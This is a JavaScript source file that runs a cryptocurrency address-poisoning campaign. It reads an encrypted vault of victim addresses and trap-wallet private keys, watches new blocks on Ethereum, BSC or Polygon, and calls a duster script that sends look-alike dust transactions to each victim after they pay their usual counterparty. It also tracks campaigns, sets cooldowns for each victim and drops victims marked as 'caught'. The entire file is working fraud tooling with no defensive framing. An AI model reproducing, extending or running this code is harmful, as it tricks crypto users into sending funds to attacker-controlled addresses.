import 'dotenv/config';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
import { createPublicClient, http } from 'viem';
import { mainnet, bsc, polygon } from 'viem/chains';
import { exec } from 'child_process';
import { promisify } from 'util';
import { createClient } from '@supabase/supabase-js';

import { config } from '../lib/config.js';
import logger from '../lib/logger.js';
import { withRetry } from '../lib/retry.js';
import { sendAlert } from '../lib/notifier.js';
import { setupGracefulShutdown, onShutdown } from '../lib/shutdown.js';
import { decrypt } from '../lib/encryption.js';

// --- Recreate __dirname for ES Modules ---
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const execAsync = promisify(exec);

console.log('[DEBUG] Starting re_poison.js...');

// --- Supabase Service Client (bypass RLS) ---
const supabaseUrl = process.env.NEXT_PUBLIC_SUPABASE_URL;
const supabaseServiceKey = process.env.SUPABASE_SERVICE_ROLE_KEY;
let supabaseService = null;
if (supabaseUrl && supabaseServiceKey) {
  supabaseService = createClient(supabaseUrl, supabaseServiceKey);
  console.log('[DEBUG] Supabase service client initialized');
} else {
  console.warn('[DEBUG] Supabase service credentials missing – campaign lookup disabled');
}

// --- Config ---
const {
  files: { vault: vaultFile, caught: caughtFile }, 
  rpc: { observer: observerRpcUrl },
  rePoison: { cooldownMs, dustRetries, delayBetweenMs },
} = config;

// --- State ---
const victims = new Map();
let blockPollInterval = null;
let caughtVictimsPollInterval = null;
let lastBlockProcessed = 0n;

// Async Mutex Lock to prevent RPC exhaustion
let isScanning = false; 

// --- Caught victims file (Cross-Process Sync) ---
const CAUGHT_FILE = caughtFile; 
const caughtVictims = new Set();

// Safely load dynamically so it stays synced using an atomic Set replacement
function loadCaughtVictims() {
  try {
    if (fs.existsSync(CAUGHT_FILE)) {
      const data = fs.readFileSync(CAUGHT_FILE, 'utf8');
      
      // Prevent race conditions if the python script is mid-write (0-byte file)
      if (data.trim().length === 0) return; 
      
      const lines = data.split('\n').map(l => l.trim()).filter(l => l.length > 0);
      
      // Build a temporary set to ensure atomic replacement
      const newSet = new Set(lines.map(addr => addr.toLowerCase()));
      
      caughtVictims.clear();
      newSet.forEach(addr => caughtVictims.add(addr));
    }
  } catch (err) {
    console.warn(`[DEBUG] Could not read caught victims file: ${err.message}`);
  }
}
// Initial load
loadCaughtVictims();
console.log(`[DEBUG] Initially loaded ${caughtVictims.size} caught victims from ${CAUGHT_FILE}`);

// --- MULTI‑CHAIN ---
const chainName = config.chain || 'ethereum';
const chainCfg = config.getChainConfig ? config.getChainConfig() : null;
const nativeSymbol = chainCfg?.nativeSymbol || 'ETH';
const chainId = chainCfg?.chainId || 1;

let viemChain;
switch (chainName) {
  case 'bsc':
    viemChain = bsc;
    break;
  case 'polygon':
    viemChain = polygon;
    break;
  default:
    viemChain = mainnet;
}

// RPC URL: prefer chain‑specific RPC, otherwise use legacy observerRpcUrl
const chainRpc = chainCfg?.rpc || observerRpcUrl;

console.log(`[DEBUG] Chain: ${chainName}, Native symbol: ${nativeSymbol}, Viem chain: ${viemChain.name}`);
console.log(`[DEBUG] Observer RPC: ${chainRpc}`);
console.log('[DEBUG] cooldownMs:', cooldownMs);
console.log('[DEBUG] dustRetries:', dustRetries);
console.log('[DEBUG] delayBetweenMs:', delayBetweenMs);

const COOLDOWN_MS = cooldownMs || 60 * 60 * 1000;
const DUST_RETRIES = dustRetries || 2;
const DELAY_BETWEEN_DUST_MS = delayBetweenMs || 2000;
const EXEC_TIMEOUT_MS = 60000;

// --- Dynamic cooldown limits (from env or defaults) ---
const MIN_COOLDOWN_MS = parseInt(process.env.MIN_COOLDOWN_MS || '600000', 10);     // 10 min
const MAX_COOLDOWN_MS = parseInt(process.env.MAX_COOLDOWN_MS || '3600000', 10);   // 1 hour

// --- Deduplication and concurrency control ---
const processedTxHashes = new Map();  // hash -> timestamp

// FIX: Change to trapLocks to lock by private key, preventing cross-process nonce collisions
const trapLocks = new Map();        

// --- Per‑victim statistics & transaction timestamps for dynamic cooldown ---
const victimStats = new Map();               // victim -> { attempts, successes, failures }
const victimTxTimestamps = new Map();         // victim -> [timestamp1, timestamp2, ...] (last 10)
let lastStatsLogTime = 0;
const STATS_LOG_INTERVAL_MS = 60 * 60 * 1000; // 1 hour

// --- HTTP client for block polling ---
const client = createPublicClient({
  chain: viemChain,
  transport: http(chainRpc, { timeout: 10000 }),
});

// --- Helper: retry wrapper ---
async function withRpcRetry(fn, context, maxAttempts = 2, baseDelay = 1000, shouldRetry = () => true) {
  return withRetry(fn, context, maxAttempts, baseDelay, shouldRetry);
}

// --- Compute dynamic cooldown for a victim based on their recent tx timestamps ---
function getDynamicCooldown(victimAddress) {
  const timestamps = victimTxTimestamps.get(victimAddress) || [];
  if (timestamps.length < 2) return COOLDOWN_MS; 

  let intervals = [];
  for (let i = 1; i < timestamps.length; i++) {
    intervals.push(timestamps[i] - timestamps[i-1]);
  }
  const avgInterval = intervals.reduce((a,b) => a+b, 0) / intervals.length;

  let cooldown = avgInterval * 0.3;
  cooldown = Math.max(MIN_COOLDOWN_MS, Math.min(MAX_COOLDOWN_MS, cooldown));
  return cooldown;
}

// --- Parse vault (async) ---
async function parseVault(filePath) {
  console.log(`[DEBUG] parseVault called for ${filePath}`);
  if (!fs.existsSync(filePath)) {
    logger.error(`${filePath} not found.`);
    process.exit(1);
  }
  const lines = fs.readFileSync(filePath, 'utf8').split('\n');
  console.log(`[DEBUG] Read ${lines.length} lines from vault.`);
  let loaded = 0;
  let lineNumber = 0;
  let errorCount = 0;
  let skippedNoCampaign = 0;

  for (const rawLine of lines) {
    lineNumber++;
    const line = rawLine.trim();
    if (!line) continue;
    
    let decryptedLine;
    try {
      decryptedLine = decrypt(line);
    } catch (e) {
      errorCount++;
      continue;
    }
    const match = decryptedLine.match(/Victim:\s*(0x[a-fA-F0-9]{40}).*Counterparty:\s*(0x[a-fA-F0-9]{40}).*Key:\s*(0x[a-fA-F0-9]{64})/i);
    if (match) {
      const victim = match[1].toLowerCase();
      const counterparty = match[2].toLowerCase();
      const privateKey = match[3];
      
      let campaignId = null;
      // Try to lookup campaign from traps table using counterparty (trap address)
      if (supabaseService) {
        try {
          const { data, error } = await supabaseService
            .from('traps')
            .select('campaign_id')
            .eq('trap_address', counterparty)
            .maybeSingle();
          if (error) {
            console.warn(`[DEBUG] Supabase query error for ${counterparty}: ${error.message}`);
          } else if (data) {
            campaignId = data.campaign_id;
          }
        } catch (err) {
          console.warn(`[DEBUG] Error looking up campaign for ${counterparty}: ${err.message}`);
        }
      }
      
      if (!campaignId) {
        skippedNoCampaign++;
        // Still store but with null campaign_id – alerts will use global config
      }

      victims.set(victim, {
        privateKey,
        trapAddress: counterparty,
        counterparty,
        lastPoison: 0,
        campaignId,
      });
      loaded++;
    } else {
      const fallback = decryptedLine.match(/Target:\s*(0x[a-fA-F0-9]{40}).*Key:\s*(0x[a-fA-F0-9]{64})/i);
      if (fallback) {
        const victim = fallback[1].toLowerCase();
        const privateKey = fallback[2];
        // For fallback, we can't get trap address, so no campaign lookup
        victims.set(victim, {
          privateKey,
          trapAddress: null,
          counterparty: null,
          lastPoison: 0,
          campaignId: null,
        });
        loaded++;
      }
    }
  }
  console.log(`[DEBUG] Finished parsing. Loaded ${loaded} victims, ${errorCount} errors, ${skippedNoCampaign} without campaign.`);
  logger.info(`Loaded ${loaded} victims from ${filePath}`);
  return loaded;
}

// --- Send dust via duster.py ---
async function sendDust(privateKey, victimAddress, campaignId) {
  // Construct an absolute path so process managers (like PM2) don't break
  const dusterPath = path.resolve(__dirname, '../tools/duster.py');
  
  // Pass campaign_id as environment variable
  const env = { ...process.env, CHAIN: chainName };
  if (campaignId) {
    env.CAMPAIGN_ID = campaignId;
  }
  
  const cmd = `python3 ${dusterPath} ${privateKey} ${victimAddress}`;
  
  try {
    const { stdout, stderr } = await execAsync(cmd, { timeout: EXEC_TIMEOUT_MS, env });
    if (stderr) logger.warn(`duster stderr: ${stderr}`);
    logger.info(`duster stdout: ${stdout.trim()}`);
    return true;
  } catch (error) {
    if (error.killed && error.signal === 'SIGTERM') {
      logger.error(`duster timed out after ${EXEC_TIMEOUT_MS}ms`);
    } else {
      logger.error(`duster error: ${error.message}`);
    }
    return false;
  }
}

// --- Poison a victim ---
async function poisonVictim(victimAddress, privateKey, campaignId) {
  logger.info(`Re‑poisoning victim ${victimAddress}...`);
  let successCount = 0;
  for (let i = 0; i < DUST_RETRIES; i++) {
    const ok = await sendDust(privateKey, victimAddress, campaignId);
    if (ok) successCount++;
    if (i < DUST_RETRIES - 1) {
      await new Promise(resolve => setTimeout(resolve, DELAY_BETWEEN_DUST_MS));
    }
  }
  const msg = `Re‑poison complete: ${successCount}/${DUST_RETRIES} dust tx sent to ${victimAddress}`;
  logger.info(msg);
  
  try {
    await sendAlert(`♻️ ${msg}`, 'info', campaignId);
  } catch (err) {
    logger.warn(`Failed to send re-poison summary alert: ${err.message}`);
  }
  
  const entry = victims.get(victimAddress);
  if (entry) entry.lastPoison = Date.now();

  let stats = victimStats.get(victimAddress) || { attempts: 0, successes: 0, failures: 0 };
  stats.attempts++;
  if (successCount > 0) stats.successes++;
  else stats.failures++;
  victimStats.set(victimAddress, stats);

  const totalAttempts = Array.from(victimStats.values()).reduce((sum, s) => sum + s.attempts, 0);
  const now = Date.now();
  if (totalAttempts % 10 === 0 || now - lastStatsLogTime > STATS_LOG_INTERVAL_MS) {
    let summary = `📊 Re‑poison stats (total attempts: ${totalAttempts}):\n`;
    for (const [addr, s] of victimStats) {
      summary += `  ${addr}: ${s.successes} success, ${s.failures} fail (${s.attempts} attempts)\n`;
    }
    logger.info(summary);
    lastStatsLogTime = now;
  }
}

// --- Check a single transaction ---
function checkTransaction(tx) {
  // Explicitly safeguard null tx.to early return
  if (!tx || !tx.from || !tx.to || !tx.hash) return; 

  const from = tx.from.toLowerCase();
  const to = tx.to.toLowerCase();
  const hash = tx.hash;
  const now = Date.now();

  // Deduplicate
  if (processedTxHashes.has(hash)) return;
  processedTxHashes.set(hash, now); 

  // Hard Size Cap Memory Management
  if (processedTxHashes.size > 50000) {
    const toDelete = Math.min(10000, processedTxHashes.size - 50000);
    let count = 0;
    for (const [key] of processedTxHashes) {
      if (count++ >= toDelete) break;
      processedTxHashes.delete(key);
    }
  }

  // Caught victim exclusion (Now stays actively synced)
  if (caughtVictims.has(from)) {
    victims.delete(from);
    return;
  }

  if (!victims.has(from)) return; 

  const entry = victims.get(from);

  // The Counterparty wildcard trigger
  if (entry.counterparty && to !== entry.counterparty) {
    return;
  }

  // Dynamic cooldown check
  let timestamps = victimTxTimestamps.get(from) || [];
  timestamps.push(Date.now());
  if (timestamps.length > 10) timestamps = timestamps.slice(-10);
  victimTxTimestamps.set(from, timestamps);

  const dynamicCooldown = getDynamicCooldown(from);
  if (now - entry.lastPoison < dynamicCooldown) return;

  // FIX: Prevent overlapping poison calls by TRAP WALLET (Private Key)
  if (trapLocks.get(entry.privateKey)) {
    console.log(`[DEBUG] Trap wallet for victim ${from} is currently busy. Skipping to prevent nonce collision.`);
    return;
  }
  trapLocks.set(entry.privateKey, true);

  // Async Execution
  (async () => {
    try {
      const counterpartyMsg = entry.counterparty ? entry.counterparty : "[WILDCARD TARGET]";
      logger.info(`Victim ${from} sent to ${counterpartyMsg}: ${tx.hash}`);
      
      try {
        await sendAlert(`🔔 Victim targeting counterparty\nVictim: ${from}\nCounterparty: ${counterpartyMsg}\nTX: ${tx.hash}`, 'info', entry.campaignId);
      } catch (alertErr) {
        logger.warn(`Failed to send initial alert: ${alertErr.message}`);
      }

      await poisonVictim(from, entry.privateKey, entry.campaignId);
    } catch (err) {
      logger.error(`Error in async poison task for ${from}: ${err.message}`);
    } finally {
      // Release the Trap Wallet lock after the python script fully completes
      trapLocks.delete(entry.privateKey); 
    }
  })();
}

// --- Block scanner ---
async function scanNewBlocks() {
  // Polling Mutex lock to prevent Event Loop stacking
  if (isScanning) return;
  isScanning = true;

  try {
    const currentBlock = await withRpcRetry(
      () => client.getBlockNumber(),
      'getBlockNumber',
      2,
      1000
    );

    if (lastBlockProcessed === 0n) {
      lastBlockProcessed = currentBlock;
      return;
    }

    for (let block = lastBlockProcessed + 1n; block <= currentBlock; block++) {
      const fullBlock = await withRpcRetry(
        () => client.getBlock({ blockNumber: block, includeTransactions: true }),
        `getBlock(${block})`,
        2,
        1000
      );
      
      if (fullBlock && fullBlock.transactions) {
        for (const tx of fullBlock.transactions) {
          try {
            checkTransaction(tx);
          } catch (err) {
             logger.warn(`Error evaluating tx ${tx.hash}: ${err.message}`);
          }
        }
      }
    }

    lastBlockProcessed = currentBlock;
  } catch (err) {
    logger.warn(`Block scan error: ${err.message}`);
  } finally {
    isScanning = false; // Release the Mutex lock
  }
}

// --- Start watcher ---
function startWatcher() {
  console.log('[DEBUG] Starting block‑based watcher...');
  logger.info('Watching new blocks for victim → counterparty transactions...');

  (async () => {
    try {
      lastBlockProcessed = await client.getBlockNumber();
      console.log(`[DEBUG] Starting from block ${lastBlockProcessed}`);
    } catch (e) {
      console.error(`[DEBUG] Failed to get initial block: ${e.message}`);
    }
  })();

  blockPollInterval = setInterval(scanNewBlocks, 2000);
  
  // Start the cross-process sync interval for caught.txt every 15 seconds
  caughtVictimsPollInterval = setInterval(loadCaughtVictims, 15000); 
  
  console.log('[DEBUG] Watcher started.');
}

// --- Graceful shutdown ---
setupGracefulShutdown();

onShutdown(async () => {
  console.log('[DEBUG] Shutting down...');
  if (blockPollInterval) clearInterval(blockPollInterval);
  if (caughtVictimsPollInterval) clearInterval(caughtVictimsPollInterval);
  console.log('[DEBUG] Intervals cleared.');
});

// --- Main ---
console.log('[DEBUG] Parsing vault...');
const loaded = await parseVault(vaultFile);
if (loaded === 0) {
  logger.error(`No victims loaded from ${vaultFile}. Exiting.`);
  console.error(`[DEBUG] No victims loaded. Exiting.`);
  process.exit(1);
}

console.log('[DEBUG] Starting watcher...');
startWatcher();
logger.info('Re‑poisoner is running. Press Ctrl+C to stop.');